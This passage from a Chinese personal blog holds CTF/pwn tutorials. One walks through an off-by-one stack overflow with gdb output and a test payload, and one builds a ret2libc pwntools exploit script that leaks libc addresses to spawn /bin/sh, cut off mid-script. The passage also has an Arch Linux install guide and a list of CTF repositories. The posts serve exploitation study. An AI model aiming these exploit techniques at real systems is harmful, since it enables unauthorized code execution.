class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line">    bar(arg); <span class="comment">/* [1] */</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line">    <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);</div><div class="line">        fflush(<span class="built_in">stdout</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// compilation </span></div><div class="line">gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o vuln vuln.c</div></pre></td></tr></table></figure>
<blockquote>
<p>注意这里的对齐参数,默认是等于4,对齐到2^4=16字节的,我们调整为4字节<br>内存对齐具体可以参考下<a href="http://blog.csdn.net/yayong/article/details/170842" target="_blank" rel="external">这一个</a></p>
</blockquote>
<p>这里造成溢出的是bar函数中的<code>strcpy</code>, 这里的缓冲区<code>buf</code>有256字节,在main函数里面判断是<code>strlen(argv[1])&gt;256</code>,字符串最大可以是256字节,看起来好像是刚刚好.但其实并不是这样子<br>我们找到strcpy的介绍</p>
<blockquote>
<p>Copies the C string pointed by source into the array pointed by destination, including the terminating null character</p>
</blockquote>
<p>strcpy会把第257个字节的<code>\0</code>也写到目的缓冲区,这个时候就会到<code>buf</code>再靠上的一个字节,在这里,可能会把bar函数存的ebp的低位字节变成<code>\0</code>,我们来试一试</p>
<p>我们在<code>main</code>这里打个断点,然后<code>输入256个A</code>,进入调试,一路下一步走到bar函数里<br>这个时候,我们的<code>$ebp = 0xffffcaec</code>,然后其实,这个<code>ebp</code>是caller的ebp,这里push一下,等会还要给人家pop回去,这里也能想象,虽然覆盖发生在<code>bar函数</code>,但最后出问题却不在bar函数,是等<code>bar</code>函数要ret回去到<code>foo</code>的时候,才会把错误的ebp给pop出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r `python -c 'print "A"*256'`</div><div class="line"></div><div class="line">[------------------code-------------------]</div><div class="line">=&gt; <span class="number">0x80484dc</span> &lt;bar&gt;:	push   ebp</div><div class="line">   <span class="number">0x80484dd</span> &lt;bar+<span class="number">1</span>&gt;:	mov    ebp,esp</div><div class="line">   <span class="number">0x80484df</span> &lt;bar+<span class="number">3</span>&gt;:	sub    esp,<span class="number">0x100</span></div><div class="line">   <span class="number">0x80484e5</span> &lt;bar+<span class="number">9</span>&gt;:	push   DWORD PTR [ebp+<span class="number">0x8</span>]</div><div class="line">   <span class="number">0x80484e8</span> &lt;bar+<span class="number">12</span>&gt;:	lea    eax,[ebp<span class="number">-0x100</span>]</div><div class="line">   <span class="number">0x80484ee</span> &lt;bar+<span class="number">18</span>&gt;:	push   eax</div><div class="line">   <span class="number">0x80484ef</span> &lt;bar+<span class="number">19</span>&gt;:	call   <span class="number">0x8048380</span> &lt;<span class="built_in">strcpy</span>@plt&gt;</div><div class="line">   <span class="number">0x80484f4</span> &lt;bar+<span class="number">24</span>&gt;:	add    esp,<span class="number">0x8</span></div><div class="line">   <span class="number">0x80484f7</span> &lt;bar+<span class="number">27</span>&gt;:	nop</div><div class="line">   <span class="number">0x80484f8</span> &lt;bar+<span class="number">28</span>&gt;:	leave  </div><div class="line">   <span class="number">0x80484f9</span> &lt;bar+<span class="number">29</span>&gt;:	ret</div></pre></td></tr></table></figure>
<p>执行过strcpy之后我们的EBP存的值以及变化了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">原来</div><div class="line">EBP: <span class="number">0xffffcae0</span> --&gt; <span class="number">0xffffcaec</span></div><div class="line">现在可以看到后最后一个字节果然变成了<span class="number">0x00</span></div><div class="line">EBP: <span class="number">0xffffcae0</span> --&gt; <span class="number">0xffffca00</span></div></pre></td></tr></table></figure></p>
<p>执行到<code>leave</code>,前面说过<code>leave</code>是相当于<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov esp, ebp</div><div class="line">pop ebp</div></pre></td></tr></table></figure></p>
<p>这个时候,先是我们的<code>mov esp, ebp</code><br><code>$esp = 0xffffcae0 --&gt; 0xffffca00</code><br>然后<code>pop ebp</code><br><code>$ebp = 0xffffca00</code></p>
<p>之后ret回到foo的时候,我们的ebp就不对了,不对了有什么影响呢,我们看看返回到了foo<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">   <span class="number">0x80484cb</span> &lt;foo&gt;:	push   ebp</div><div class="line">   <span class="number">0x80484cc</span> &lt;foo+<span class="number">1</span>&gt;:	mov    ebp,esp</div><div class="line">   <span class="number">0x80484ce</span> &lt;foo+<span class="number">3</span>&gt;:	push   DWORD PTR [ebp+<span class="number">0x8</span>]</div><div class="line">   <span class="number">0x80484d1</span> &lt;foo+<span class="number">6</span>&gt;:	call   <span class="number">0x80484dc</span> &lt;bar&gt;</div><div class="line">=&gt; <span class="number">0x80484d6</span> &lt;foo+<span class="number">11</span>&gt;:	add    esp,<span class="number">0x4</span></div><div class="line">   <span class="number">0x80484d9</span> &lt;foo+<span class="number">14</span>&gt;:	nop</div><div class="line">   <span class="number">0x80484da</span> &lt;foo+<span class="number">15</span>&gt;:	leave  </div><div class="line">   <span class="number">0x80484db</span> &lt;foo+<span class="number">16</span>&gt;:	ret</div></pre></td></tr></table></figure></p>
<p>看到这里的leave了咩,这里会把我们错误的ebp给esp,相当于我控制了esp,好吧,我控制的不太好,只能改变他的末字节…先不说这个,我们相当不稳的控制了esp,会让下面ret到奇怪的地方对不对,对吧,因为ret实际就是<code>pop</code>出来一个返回地址,然后跳过去,从哪里pop,就是从栈顶esp这里啊</p>
<p>这个时候思路很清楚了就是要把这里要pop出来的返回地址改成我们想要的<br>因为整个过程我们相当于通过<code>strcpy</code>把<code>foo</code>的ebp低字节改掉了,导致在第二次leave的时候,改掉了栈顶esp,因为是最后一个字节变小了,这个改变在2^8=256字节之内,而且是变小</p>
<p>啊,还有,某个四字节变量比如<code>*0xffff7840</code>,他的值存在<code>0xffff7840-0xffff7843</code>,你取值给的是最低字节地址,像下图,我们正常指向的话,我上面那个箭头指的变量是<code>ret2main</code>,而不是<code>main_ebp</code></p>
<p>正常情况下要ret的时候是这样子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-------------- 高地址</div><div class="line">ret2main</div><div class="line">-------------- <span class="number">0xffffcae0</span> &lt;---- 我们的esp应该在这里</div><div class="line">main_ebp</div><div class="line">--------------</div><div class="line">foo的局部变量</div><div class="line">-------------</div><div class="line">ret2foo</div><div class="line">-------------</div><div class="line">err_foo_ebp</div><div class="line">-------------</div><div class="line"><span class="number">256</span>字节缓冲区  &lt;------ 而事实上我们的esp现在在这里面不知道哪个地方</div><div class="line">-------------</div><div class="line">bar其他局部变量</div></pre></td></tr></table></figure></p>
<p>这样的话,只要我们构造一个合理的输入数据,就可以造成任意地址返回了,这里我们先不考虑地址随机化,这个时候我们拿出来传说中的<code>pattern_create</code>造一个256字符的数据把产生的数据喂给程序,跑一下</p>
<p>然后在程序走到foo的ret时候就可以看到,栈里的数据,把这个数据拷出来,用<code>pattern_offset</code>搞一下就知道是在跳到了我们这256字节的哪里了,或者等程序崩了,也会有提示</p>
<p>其实在其他情况下,这里也可能不在我们控制范围内,因为,也可能正好跳到原<code>ret2main</code>和我们可控的这256字节缓冲区之间对吧,不过可能性比较小</p>
<p>具体操作一下<br>产生256字节pattern然后给程序</p>
<p>片刻之后,程序崩溃了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Stopped reason: SIGSEGV</div><div class="line"><span class="number">0x61414145</span> in ?? ()</div></pre></td></tr></table></figure></p>
<p>定位一下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern_offset <span class="number">0x61414145</span></div><div class="line"><span class="number">1631666501</span> found at offset: <span class="number">36</span></div></pre></td></tr></table></figure></p>
<p>改一下payload再给程序<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print 'A' * 36 + 'BCDE' + (256 - 36 - 4) * 'A'</div></pre></td></tr></table></figure></p>
<p>因为我们这里没有具体的跳转地址,就把目标地址定为’BCDE’<br>可以看到我们的程序在崩溃的时候到了这个地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Stopped reason: SIGSEGV</div><div class="line"><span class="number">0x45444342</span> in ?? ()</div></pre></td></tr></table></figure>
<p>测试成功</p>
<h2 id="不能off-by-one"><a href="#不能off-by-one" class="headerlink" title="不能off-by-one"></a>不能off-by-one</h2><p>作者提到两种情况不能像这样子利用<code>off-by-one</code></p>
<ol>
<li><p>Some other local variable might be present above the destination buffer.<br>就是说我们的<code>buf</code>不是紧挨着<code>ebp</code>的中间还有其他变量,因为我们只能覆盖一字节,所以就无能为力了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> x = <span class="number">10</span>; <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [2] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [3] */</span> </div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure>
</li>
<li><p>Alignment space<br>可能gcc会默认出现内存对齐到16字节….,这个时候在我们的buf和ebp之间就还是有空隙了</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi</div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">and</span> $<span class="number">0xfffffff0</span>,%esp               <span class="comment">//Stack space aligned to 16 byte boundary</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: sub $<span class="number">0x20</span>,%esp                     <span class="comment">//create stack space</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>原文中为了确保不出现这种情况,我们编译时候加入参数让他对齐到四字节<code>-mpreferred-stack-boundary=2</code></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安装Arch Linux]]></title>
      <url>/2017/07/24/%E5%AE%89%E8%A3%85Arch-Linux/</url>
      <content type="html"><![CDATA[<p>docker没搞好,所以安装了一下arch,安装的速度炒鸡快,感觉以后临时用可以用它<br>是在我ubuntu下的VMware下装的,没空间了,只划了两个G,装完占用1.5G左右<br>而且整个都是mbr传统启动方式</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>准备当然是ustc的mirror那里download了一张x86_64的arch的iso<br>丢到虚拟机里,启动,等待</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>由于虚拟机,我直接开了NAT,所以直接有网,不过还是执行了下<code>dhcpcd</code>,忘了看不跑着一条,能不能自己获取到ip</p>
<h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fdisk /dev/sda</div></pre></td></tr></table></figure>
<p>进入交互环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">o 新建分区表</div><div class="line">n 建立新分区</div><div class="line">然后一路回车</div><div class="line">最后</div><div class="line">w 把更改写入磁盘</div></pre></td></tr></table></figure></p>
<h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkfs.ext4 /dev/sda</div></pre></td></tr></table></figure>
<h3 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount /dev/sda /mnt</div></pre></td></tr></table></figure>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先把ustc的源加到最前面<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vim /etc/pacman.d/mirrorlist</div><div class="line"></div><div class="line"><span class="comment">## China</span></div><div class="line">Server = http://mirrors.ustc.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></div></pre></td></tr></table></figure></p>
<p>然后安装安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacstrap /mnt base base-devel</div></pre></td></tr></table></figure></p>
<p>安装完之后看看我们的<code>/mnt</code>多了很多东西</p>
<h3 id="自动挂载"><a href="#自动挂载" class="headerlink" title="自动挂载"></a>自动挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</div></pre></td></tr></table></figure>
<p>这个我不太懂,大概就是下次不需要手动挂载了</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arch-chroot /mnt</div></pre></td></tr></table></figure>
<p>这个是把原来的<code>/mnt</code>变成了根目录</p>
<p>安装grub2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacman -S grub</div></pre></td></tr></table></figure></p>
<p>把grub安装到硬盘<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grub-install --target=i386-pc /dev/sda --force</div></pre></td></tr></table></figure></p>
<p>这里<code>i386-pc</code>是说传统mbr启动,不是UEFI</p>
<p>生成配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grub-mkconfig -o /boot/grub/grub.cfg</div></pre></td></tr></table></figure></p>
<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd</div></pre></td></tr></table></figure>
<h3 id="好了-重启重启"><a href="#好了-重启重启" class="headerlink" title="好了,重启重启"></a>好了,重启重启</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reboot</div></pre></td></tr></table></figure>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pacman -S net-tools  <span class="comment"># ifconfig route</span></div><div class="line">pacman -S dnsutils  <span class="comment"># dig nslookup </span></div><div class="line">pacman -S netcat</div><div class="line">pacman -S socat</div></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[收集pwn题目]]></title>
      <url>/2017/07/23/%E6%94%B6%E9%9B%86pwn%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p>想要学习pwn,发现没有题目TAT<br>然后到xctf oj上面发现pwn的都已经下载不了了<br>后来惊喜的发现有一些大佬把自己做过的比赛题目存下来了,记一下</p>
<ol>
<li><a href="https://github.com/Hcamael/CTF_repo" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo</a></li>
<li><a href="https://github.com/o0xmuhe/PwnableLog" target="_blank" rel="external">https://github.com/o0xmuhe/PwnableLog</a></li>
<li><a href="https://github.com/sixstars/CTF" target="_blank" rel="external">https://github.com/sixstars/CTF</a></li>
<li><a href="https://github.com/Winter3un/ctf_task" target="_blank" rel="external">https://github.com/Winter3un/ctf_task</a></li>
</ol>
<p>后面这个大佬一个人屯了好多题,一大箩筐,真可怕</p>
<ol>
<li><a href="https://github.com/Trietptm-on-Security/Pwnables-solutions" target="_blank" rel="external">https://github.com/Trietptm-on-Security/Pwnables-solutions</a></li>
<li><a href="https://github.com/p4-team/ctf" target="_blank" rel="external">https://github.com/p4-team/ctf</a></li>
</ol>
<p>差不多就这些</p>
<p>还有HCTF 2016 <a href="https://github.com/vidar-team/HCTF2016" target="_blank" rel="external">https://github.com/vidar-team/HCTF2016</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[从负开始学汇编1]]></title>
      <url>/2017/07/23/%E4%BB%8E%E8%B4%9F%E5%BC%80%E5%A7%8B%E5%AD%A6%E6%B1%87%E7%BC%961/</url>
      <content type="html"><![CDATA[<h2 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h2><p>直接把main函数所有代码亮出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">=&gt; 0x8048594:	push   ebp</div><div class="line">   0x8048595:	mov    ebp,esp</div><div class="line">   0x8048597:	and    esp,0xfffffff0</div><div class="line">   0x804859a:	sub    esp,0x10</div><div class="line">   0x804859d:	mov    DWORD PTR [esp],0x1</div><div class="line">   0x80485a4:	call   0x8048400 &lt;alarm@plt&gt;</div><div class="line"></div><div class="line">   0x80485a9:	mov    eax,ds:0x804a044</div><div class="line">   0x80485ae:	mov    DWORD PTR [esp+0x4],0x0</div><div class="line">   0x80485b6:	mov    DWORD PTR [esp],eax</div><div class="line">   0x80485b9:	call   0x80483e0 &lt;setbuf@plt&gt;</div><div class="line"></div><div class="line">   0x80485be:	mov    eax,ds:0x804a060</div><div class="line">   0x80485c3:	mov    DWORD PTR [esp+0x4],0x0</div><div class="line">   0x80485cb:	mov    DWORD PTR [esp],eax</div><div class="line">   0x80485ce:	call   0x80483e0 &lt;setbuf@plt&gt;</div><div class="line"></div><div class="line">   0x80485d3:	mov    eax,ds:0x804a040</div><div class="line">   0x80485d8:	mov    DWORD PTR [esp+0x4],0x0</div><div class="line">   0x80485e0:	mov    DWORD PTR [esp],eax</div><div class="line">   0x80485e3:	call   0x80483e0 &lt;setbuf@plt&gt;</div><div class="line"></div><div class="line">   0x80485e8:	mov    DWORD PTR [esp],0x8048690</div><div class="line">   0x80485ef:	call   0x8048410 &lt;puts@plt&gt;</div><div class="line"></div><div class="line">   0x80485f4:	call   0x804854d</div><div class="line">   0x80485f9:	mov    eax,0x0</div><div class="line">   0x80485fe:	leave  </div><div class="line">   0x80485ff:	ret</div></pre></td></tr></table></figure></p>
<p>程序大体就是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alarm(<span class="number">1</span>) =&gt; setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>) =&gt; sefbuf(<span class="built_in">stdout</span>, <span class="number">0</span>) =&gt; setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>) =&gt; sub_804854d()</div></pre></td></tr></table></figure></p>
<p>这个前面没什么hack点,我们跳到<code>sub_804854d</code>里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0x804854d:	push   ebp</div><div class="line">0x804854e:	mov    ebp,esp</div><div class="line">0x8048550:	sub    esp,0x98</div><div class="line">0x8048556:	mov    DWORD PTR [esp+0x8],0x100    ;0x100</div><div class="line">0x804855e:	lea    eax,[ebp-0x88]   ; buffer_addr</div><div class="line">0x8048564:	mov    DWORD PTR [esp+0x4],eax</div><div class="line">0x8048568:	mov    DWORD PTR [esp],0x0  ; 0x0</div><div class="line">0x804856f:	call   0x80483f0 &lt;read@plt&gt; ; read(0, [ebp -0x88], 0x100)</div><div class="line"></div><div class="line">0x8048574:	mov    DWORD PTR [esp+0x8],0x100 ;0x100</div><div class="line">0x804857c:	lea    eax,[ebp-0x88]   </div><div class="line">0x8048582:	mov    DWORD PTR [esp+0x4],eax  ; buffer_addr</div><div class="line">0x8048586:	mov    DWORD PTR [esp],0x1  ; 0x1</div><div class="line">0x804858d:	call   0x8048440 &lt;write@plt&gt;    ; write(1, [ebp - 0x88], 0x100)</div><div class="line"></div><div class="line">0x8048592:	leave  ; mov esp, ebp; pop ebp</div><div class="line">0x8048593:	ret</div></pre></td></tr></table></figure></p>
<p>这里先把栈抬高了0x98,靠近栈顶<code>esp</code>的0x10个用来放等下要调用<code>read</code>和<code>write</code>的三个形参(3* 4 = 0x10), 靠近栈基的<code>0x88</code>个字节作为缓冲区,这个时候read第三个参数是0x100 &gt; 0x88这就造成了后面的栈溢出</p>
<p>我们<code>checksec</code>的结果是,只开启了<code>NX</code>,数据段不可执行,所以我们可以使用ret2libc<br>我们的思路是利用read栈溢出,覆盖<code>sub_804854d</code>的返回地址,让他指向<code>&lt;write@plt&gt;</code>,就可以调用write来打印出内存中glibc某个函数的地址,以后来后面通过偏移算出<code>system</code>和<code>/bin/sh</code>在内存中的位置,然后让<code>&lt;write@plt&gt;</code>再次返回到<code>sub_804854d</code>,这一次我们就可以在此栈溢出,并返回到<code>system(&#39;/bin/sh&#39;)</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">   read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>); <span class="comment">// =&gt; 写入内容大概是 'A' * 0x88 + 'BBBB' + &lt;write@plt&gt; + ret_addr_of_write + arg1 + arg2 + arg3</span></div><div class="line">=&gt; write(<span class="number">1</span>, &lt;write@got&gt;, <span class="number">0x4</span>); <span class="comment">// =&gt; get到加载好的glibc中的write地址, 参数就是上面的arg1~3</span></div><div class="line">=&gt; sub_804854d  <span class="comment">// 就是上面填好的ret_addr_of_write</span></div><div class="line">=&gt; read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>); <span class="comment">// =&gt; 写入内容大概是 'A' * 0x88 + 'BBBB' + system + ret_addr_of_system + /bin/sh</span></div><div class="line">=&gt; system('/bin/sh')</div></pre></td></tr></table></figure>
<p>这个再注意一下,想调用某个库函数只要传入<code>&lt;xxx@plt&gt;</code>就可以了,只有要算偏移的时候,要得到库函数具体加载位置才必须要使用<code>&lt;xxx@got&gt;</code></p>
<h2 id="写payload"><a href="#写payload" class="headerlink" title="写payload"></a>写payload</h2><p>遇到了好多问题,就是recv,recvline的问题,等会说<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding: utf8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'pwn1'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</div><div class="line">    p = process(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="comment">#    context.terminal = ['gnome-terminal','-x','sh','-c']</span></div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line"></div><div class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">'plt_write='</span> + hex(plt_write)</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">'got_write='</span> + hex(got_write)</div><div class="line"></div><div class="line">vuln_addr = <span class="number">0x0804854d</span></div><div class="line">buffer_len = <span class="number">0x88</span></div><div class="line"></div><div class="line">payload1  = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * buffer_len </div><div class="line">payload1 += <span class="string">'BBBB'</span> <span class="comment"># ebp</span></div><div class="line"></div><div class="line">payload1 += p32(plt_write)  <span class="comment"># ret_addr</span></div><div class="line">payload1 += p32(vuln_addr)   <span class="comment"># write ret to vuln_function</span></div><div class="line"></div><div class="line"><span class="comment">#args of write</span></div><div class="line">payload1 += p32(<span class="number">1</span>)</div><div class="line">payload1 += p32(got_write)</div><div class="line">payload1 += p32(<span class="number">4</span>)</div><div class="line"></div><div class="line"></div><div class="line">p.send(payload1)</div><div class="line"></div><div class="line"><span class="comment"># 坑点在这里,原题目使用了一次puts,puts是自带换行的,必须用p.recvline()</span></div><div class="line">p.recvline()</div><div class="line"></div><div class="line"><span class="comment"># 你要先接受0x100字节的输出,是来自write(1, buf, 0x100)</span></div><div class="line"><span class="comment"># 